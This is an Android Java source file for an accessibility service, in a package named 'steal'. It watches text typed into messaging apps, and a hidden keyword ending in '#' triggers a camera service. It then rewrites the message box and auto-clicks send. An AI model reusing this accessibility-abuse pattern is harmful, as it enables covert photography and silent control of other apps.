package com.xiaoxin.jhang.steal.service;

import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import com.xiaoxin.jhang.steal.Config;
import com.xiaoxin.jhang.steal.constant.Constant;
import com.xiaoxin.jhang.steal.util.StartCameraUtil;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

/**
 * @author xiaoxin
 * @date 2018/4/08
 * @describe :
 * 修改内容
 */

public class WxplugService extends AccessibilityService {

    private static final String TAG = "SpeakService";
    public static final String TRANSFORM = "TRANSFORM";

    /** 是否转换并发送 */
    public static boolean hasSend;
    private String mPackageName;
    private String et_id = "";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        hasSend = intent.getBooleanExtra(TRANSFORM, false);
        if (hasSend) {
            if (!TextUtils.isEmpty(mPackageName)) {

                switch (mPackageName) {
                    case Constant.TARGET_PACKAGE_MMS:
                        et_id = Constant.EDITTEXT_ID;
                        break;
                    case Constant.PACKAGE_DD:
                        et_id = Constant.DD_ET_ID;
                        break;
                }
                if (findEditTextSend(et_id)) {
                    sendContent();
                }
            }
        }

        return super.onStartCommand(intent, flags, startId);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        mPackageName = event.getPackageName().toString();
//        Log.e(TAG, "onAccessibilityEvent: "+mPackageName );
//        Log.e(TAG, "getEventType: "+event.getEventType());
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {//动态监听文本框内容变化并实时获取文本
            styContent(event);//实时转换 不可取
        }
    }

    @SuppressLint("NewApi")
    private void styContent(AccessibilityEvent event) {
        if(!TextUtils.isEmpty(event.getText().toString())) {

            String content = event.getText().toString();
            boolean contains = content.contains(Config.SpecialPic);
            Log.e(TAG, "contains: "+contains );
            if (content.contains(Config.SpecialPic) || content.contains(Config.SpecialVideo)) {
                Log.e(TAG, "styContent: "+content);
                String endStr = content.substring(content.length()-2, content.length() - 1);
                if ("#".equals(endStr)) {//以#号结尾进行拍照
                    findEditTextSend(Constant.EDITTEXT_ID);
                    StartCameraUtil.startCameraService(this, content);
                }
            }
        }
    }


    @SuppressLint("NewApi")
    private boolean findEditTextContent(String content) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            List<AccessibilityNodeInfo> editInfo = rootNode.findAccessibilityNodeInfosByViewId(content);
            if(editInfo!=null&&!editInfo.isEmpty() && editInfo.size() > 0 ){
                Bundle bundle = new Bundle();
                bundle.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,"正在拍照");
                editInfo.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);
                return true;
            }
        }
        return false;
    }

    @SuppressLint("NewApi")
    private boolean findEditTextSend(String editId) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            List<AccessibilityNodeInfo> editInfo = rootNode.findAccessibilityNodeInfosByViewId(editId);
            if(editInfo!=null&&!editInfo.isEmpty() && editInfo.size() > 0 ){
                Bundle bundle = new Bundle();
//                //这里是camera拍照
//                String editContent = editInfo.get(0).getText().toString();
//                boolean status = StartCameraUtil.startCameraActivity(this, editContent);
//                if (!status) {
//                    return status;
//                }
                //camera 结束

                bundle.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,"正在拍照");
                editInfo.get(0).performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, bundle);
                return true;
            }
        }
        return false;
    }

    @SuppressLint("NewApi")
    private void sendContent() {
        AccessibilityNodeInfo nodeInfo = getRootInActiveWindow();
        if (nodeInfo != null) {
            List<AccessibilityNodeInfo> list = nodeInfo
                    .findAccessibilityNodeInfosByText(Constant.SEND_TEXT);
            if (list != null && list.size() > 0) {
                for (AccessibilityNodeInfo n : list) {
                    if(n.getClassName().equals(Constant.BUTTON) || n.getClassName().equals(Constant.TEXTVIEW) && n.isEnabled()){
                        n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    }
                }
            }
        }
    }

    @Override
    public void onInterrupt() {
        Toast.makeText(this,"辅助服务断开连接了", Toast.LENGTH_SHORT).show();
    }
}
